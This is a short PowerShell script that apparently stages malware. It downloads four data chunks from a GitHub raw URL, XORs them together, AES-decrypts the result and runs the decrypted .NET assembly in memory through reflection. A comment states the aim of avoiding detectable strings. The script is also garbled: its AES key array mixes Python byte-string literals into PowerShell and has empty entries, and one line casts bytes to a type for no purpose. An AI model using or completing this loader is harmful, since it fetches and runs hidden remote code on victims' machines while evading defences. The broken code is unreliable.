$b='https://raw.githubusercontent.com/cem324/screenshots/main'
$ch=@();0..3|%{$u="$b/c$_";try{$ch+=([Net.WebClient]::new()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$ch+=[byte[]]$w.ResponseBody}}
$xr=[byte[]]$ch[0].Clone();1..3|%{$i=$_;0..($xr.Length-1)|%{$xr[$_]=$xr[$_]-bxor$ch[$i][$_]}}
$ak=[Byte[]]@(0xb'fM',0xb'\n\xf5',0xb'?\xbe',0xb'\xfdR',0xb'\xeb\x0f',0xb'\x97E',0xb'\x1e\x98',0xb'\xec\x1e',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'')
$iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
# Execute via reflection — no Add-Type, no static DllImport strings
$rt=[Type]$py[0];[System.Reflection.Assembly]::Load($py).EntryPoint.Invoke(0,@(,$null))
